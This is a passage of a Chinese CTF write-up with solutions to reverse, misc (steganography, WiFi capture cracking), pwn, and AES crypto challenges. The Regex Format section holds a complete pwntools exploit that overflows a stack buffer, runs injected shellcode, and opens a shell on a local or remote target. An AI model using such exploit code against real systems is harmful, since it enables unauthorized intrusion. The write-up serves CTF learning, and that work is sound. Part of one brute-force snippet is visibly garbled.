    }
注意编译的时候由于dll是x64的，因此exe理应也是用x64的
以及这里的函数声明需要使用__fastcall的调用约定，因为从汇编可以看出来
    mov     edx, 4
    mov     [rsp+158h+var_138], eax
    lea     rcx, [rsp+158h+var_138]
    call    hash
传参使用的rcx和rdx，如果用其他调用约定的话通常会用栈传参
IDA其实是已经识别出来的
返回值则需要自己根据内容看出来，向rax放了一个int64的值
    mov     rax, qword ptr [rsp+0C8h+md5_struct]
    add     rax, qword ptr [rsp+0C8h+md5_struct+20h]
    add     rax, qword ptr [rsp+0C8h+md5_struct+40h]
    add     rax, qword ptr [rsp+0C8h+md5_struct+60h]
这里IDA是识别错误的
接下来就可以直接使用该函数来爆破了
     do
        ++len;
      while ( Dst[len] );
      v7 = len;
      if ( hash((__int64)&v7, 4ui64) != (char *)0xD31580A28DD8E6C4i64 )
第一次hash使用的是len的地址，也就是把长度视作一个4字节的char数组来进行hash
因此我们首先要算出flag的长度
爆破的时候也提供一个int的空间即可
    void len()
    {
        int i;
        unsigned long long  result;
        for (i = 0;i flag{happy_rc4}
从这个flag来看算法应该是rc4，也比较负责动调中感觉到的，根据key变换table然后取table的值和明文异或
因为这个算法的特性所以也可以理解为和密钥流异或23333
## MISC Hidden Write
010看到3个ihdr和iend，分别抠出来，补齐png头89 50 4E 47 0D 0A 1A 0A
后面的两个图片存在盲水印，解出来得到flag最后一段
文件结尾字符串得到flag中间一段
然后是一个lsb隐写找到flag的第一段
## MISC Flow
首先跑wifi密码，开始跑8位数字没跑出来，于是换了一个wpa常用密码的字典去跑，秒出结果orz
参考：
解密流量，然后跟踪tcp流，得到flag
## MISC Disk
用winimage打开看到4个flag.txt
提取后看到是一堆01串，脚本解一下
## PWN Regex Format
保护全无，所以做法有很多了，我的思路是往bss上写shellcode，然后栈溢出劫持控制流到我布置好的shellcode上。
这题比较烦的就是逆向部分了吧，首先读取regex
format到.data的aBeforeUseItUnd变量后，这是做正则表达式的。然后读取一个字符串到bss上，是正则表达式匹配的对象。
程序首先会在0x08048680处的函数对正则表达式进行一个解析，比较烦的是，前面的内容是固定的Before :use$ it, :understand$*
it :first$+.，即aBeforeUseItUnd变量
一顿操作后将正则表达式分成了好几段，我们gdb看下
然后这里进行循环去匹配每段正则表达式
不过sub_8048930的第3个参数为s，而s是char s; // [esp+474h]
[ebp-D4h]，那这里就可以去进行一个栈溢出操作了，去这个函数看看
可以看到，只要正则匹配，程序就会一直进行一个赋值操作，将bss上的数据赋值给栈上的s，于是问题就是如果使这个正则一直匹配下去。很简单，我们把bss上要写的内容放进去就行了嘛。
经过一顿调试后，最终写出了如下exp
完整exp：
    #-*- coding: utf-8 -*-    from pwn import *
    __author__ = '3summer'
    s       = lambda data               :io.send(str(data)) 
    sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
    st      = lambda delim,data         :io.sendthen(str(delim), str(data))
    sl      = lambda data               :io.sendline(str(data))
    sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
    slt     = lambda delim,data         :io.sendlinethen(str(delim), str(data))
    r       = lambda numb=4096          :io.recv(numb)
    ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
    irt     = lambda                    :io.interactive()
    uu32    = lambda data               :u32(data.ljust(4, ''))
    uu64    = lambda data               :u64(data.ljust(8, ''))
    def dbg(breakpoint):
        glibc_dir = '/usr/src/glibc/glibc-2.23/'
        gdbscript = ''
        gdbscript += 'directory %smallocn' % glibc_dir
        gdbscript += 'directory %sstdio-common/n' % glibc_dir
        gdbscript += 'directory %sstdlib/n' % glibc_dir
        gdbscript += 'directory %slibion' % glibc_dir
        elf_base = int(os.popen('pmap {}| awk 27{{print 241}}27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
        gdbscript += 'b *{:#x}n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        log.info(gdbscript)
        gdb.attach(io, gdbscript)
    def exploit(local):
        _nop = asm(shellcraft.nop())
        _sh = asm(shellcraft.sh())
        _re = 'Before use$ it, understand$* it first$+.'
        _sh_addr = 0x0804A24C+0xd4+12*4
        sla('formatn', ':'+p32(_sh_addr)+_nop+_sh.replace('$', '')+'$*')
        sla('matchn', _re.ljust(0xd4, _nop) + p32(_sh_addr)*12 + _sh)
        sl('n')
        sl('./flag')
        irt()
    if __name__ == '__main__':
        binary_file = './pwn1'
        context.binary = binary_file
        context.terminal = ['tmux', 'sp', '-h', '-l', '110']
        context.log_level = 'debug'
        elf = ELF(binary_file)
        if len(sys.argv) > 1:
            io = remote(sys.argv[1], sys.argv[2])
            # libc = ELF('./libc.so.6')
            exploit(False)
        else:
            io = process(binary_file)
            libc = elf.libc
            exploit(True)
## PWN Hash Burger
Get原题一枚，exp拿下来，改下ip，端口，libc路径，直接打
## Crypto Common Crypto
很明显有两个函数与加密相关
key_generate函数中对key_struct的前16个字节进行了赋值，也就是128位的key
然后在之后与一个数组—搜索之后可以发现它是AES的SBox，进行异或，产生了轮密钥
然后在下一个函数，AES_encrypt中进行了明文和key_struct的运算
AES的特征是十轮运算、每轮进行字节替换、行移位、列混淆、轮密钥加，最后一轮缺少轮密钥加
所以要不是在十轮循环中有一个判断，要不就是九轮循环+额外三个步骤
函数内是满足这样的流程的
使用AES进行加密与动调获得的结果可以互相验证
sprintf调用了32次，而加密的结果只有16个字节，因此结果字符串中前32个字符为密文，后32个字符为明文的hex_encode
前半段进行解密、后半段则hex_decode即可
    from Cryptodome.Cipher import AES
    key = bytes.fromhex("1b2e3546586e72869ba7b5c8d9efff0c")
    aes = AES.new(key, AES.MODE_ECB)
    plain = aes.decrypt(bytes.fromhex("4dd78cfbcfc1dbd9e8f31715bf9c3464"))
    print(plain)
    print(bytes.fromhex("35316565363661623136353863303733"))
Good Job！